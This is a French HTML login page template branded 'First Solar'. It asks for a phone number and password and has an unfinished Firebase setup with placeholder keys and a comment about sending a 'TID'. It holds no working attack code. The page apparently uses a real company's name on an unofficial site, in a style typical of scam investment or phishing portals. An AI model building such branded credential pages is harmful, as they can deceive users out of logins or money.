<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>First Solar - Connexion</title>
    <style>
        :root {
            --primary-color: #f39c12;
            --dark-bg: rgba(0, 0, 0, 0.85);
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', sans-serif;
            background: url('IMG_2991.jpeg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
        }

        .overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1;
        }

        .auth-container {
            position: relative;
            z-index: 2;
            background: var(--dark-bg);
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.7);
            width: 90%;
            max-width: 380px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(8px);
        }

        h1 { color: var(--primary-color); margin-bottom: 10px; font-size: 2em; text-transform: uppercase; }
        
        .tagline { font-size: 0.9em; margin-bottom: 30px; opacity: 0.8; }

        .input-group { margin-bottom: 20px; text-align: left; }

        label { display: block; margin-bottom: 8px; font-size: 0.85em; color: var(--primary-color); }

        input {
            width: 100%;
            padding: 14px;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.2);
            background: rgba(255, 255, 255, 0.1);
            color: white;
            box-sizing: border-box;
        }

        .btn-login {
            width: 100%;
            padding: 15px;
            background: var(--primary-color);
            border: none;
            color: black;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            margin-top: 10px;
        }

        .btn-login:hover { background: #ffb433; transform: scale(1.02); }

        .footer-link { margin-top: 25px; font-size: 0.9em; }
        .footer-link a { color: var(--primary-color); text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>

<div class="overlay"></div>

<div class="auth-container">
    <h1>FIRST SOLAR</h1>
    <p class="tagline">Connectez-vous à votre espace solaire</p>
    
    <form action="dashboard.html" method="POST">
        <div class="input-group">
            <label>Numéro de téléphone</label>
            <input type="text" placeholder="Votre numéro" required>
        </div>
        <div class="input-group">
            <label>Mot de passe</label>
            <input type="password" placeholder="Votre mot de passe" required>
        </div>
        
        <button type="submit" class="btn-login">SE CONNECTER</button>
    </form>

    <div class="footer-link">
        Pas encore de compte ? <a href="index.html">Créer un compte</a>
    </div>
</div>

<script type="module">
  // 1. Importer les fonctions nécessaires
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
  import { getFirestore, collection, addDoc, doc, updateDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

  // 2. Vos clés (À récupérer sur console.firebase.google.com)
  const firebaseConfig = {
    apiKey: "VOTRE_API_KEY",
    authDomain: "votre-projet.firebaseapp.com",
    projectId: "votre-projet",
    storageBucket: "votre-projet.appspot.com",
    messagingSenderId: "123456789",
    appId: "VOTRE_APP_ID"
  };

  // 3. Initialiser la connexion
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  // 4. VOTRE LOGIQUE ICI (Ex: Envoyer le TID ou Valider)
</script>

</body>
</html>
